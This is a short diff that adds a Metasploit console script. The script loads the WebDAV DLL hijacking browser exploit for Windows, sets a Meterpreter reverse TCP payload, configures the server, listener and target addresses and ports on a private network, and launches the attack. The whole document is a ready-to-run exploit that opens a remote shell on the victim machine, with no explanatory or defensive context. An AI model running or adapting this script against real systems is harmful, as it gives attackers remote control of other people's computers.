@@ -1,0 +1,10 @@
+use exploit/windows/browser/webdav_dll_hijacker
+set payload windows/meterpreter/reverse_tcp
+show options
+set SRVHOST 192.168.2.128
+set URIPATH /
+set SRVPORT 80
+set LHOST 192.168.2.128
+set RHOST 192.168.2.131
+set LPORT 1215
+exploit
